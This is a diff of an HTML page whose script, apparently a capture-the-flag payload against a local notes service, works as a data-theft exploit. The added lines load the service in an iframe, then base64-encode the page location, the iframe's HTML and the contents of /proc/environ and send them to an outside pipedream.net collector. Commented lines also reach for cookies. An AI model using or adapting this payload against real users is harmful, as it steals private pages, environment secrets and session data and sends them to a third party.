@@ -1,17 +1,23 @@
 <html>
   <body>
     <script>
-//       var link = document.createElement("button");
-//       link.name = "action";
-//       link.onclick = "history.go(-2)";
-//       document.body.appendChild(link);
-//       var iframe = document.createElement('iframe');       
-//       document.body.appendChild(iframe);
-//       iframe.src = 'http://0.0.0.0:8080/notes';       
-//       iframe.width = '200';
-//       iframe.height = '400';
+       //var link = document.createElement("button");
+       //link.name = "action";
+       //link.onclick = "history.go(-2)";
+       //document.body.appendChild(link);
+       var iframe = document.createElement('iframe');
+       //var loadNewScript = '<script>function newDoc() {location.assign("https://www.w3schools.com")}<'+"/script>";
+       document.body.appendChild(iframe);
+       iframe.id = 'i1'
+       iframe.src = 'http://0.0.0.0:8080/notes';
+       iframe.width = '1000';
+       iframe.height = '400';
+       //iframe.contentLocation.assign('notes')
+       //iframe.body.appendChild(loadNewScript);
       async function lmao() {
-      fetch("https://enzv2dem6iht.x.pipedream.net/?a=" + btoa(await fetch("http://0.0.0.0:8080/notes").then(res => res.text())));
+      fetch("https://enzv2dem6iht.x.pipedream.net/?location=" + btoa(JSON.stringify(location)));
+      fetch("https://enzv2dem6iht.x.pipedream.net/?iframe=" + btoa(JSON.stringify(document.getElementById("i1").contentWindow.document.documentElement.outerHTML)));
+      fetch("https://enzv2dem6iht.x.pipedream.net/?src=" + btoa(await fetch("file:///proc/environ").then(res => res.text()).catch(err => { console.log(err.toString()); return err.toString(); })));
       }
       lmao()
 //       link.click();
@@ -30,7 +36,7 @@
 //           env: JSON.stringify(envr),
 //           local: JSON.stringify(local),
 //           localp: JSON.stringify(localp),
-//           noted: JSON.stringify(document.getElementById("iframe_id").contentWindow.document.documentElement.outerHTML)
+//           noted: JSON.stringify(document.getElementById("i1").contentWindow.document.documentElement.outerHTM>)
 //           cookie: document.cookie,
 //         }),
 //       });
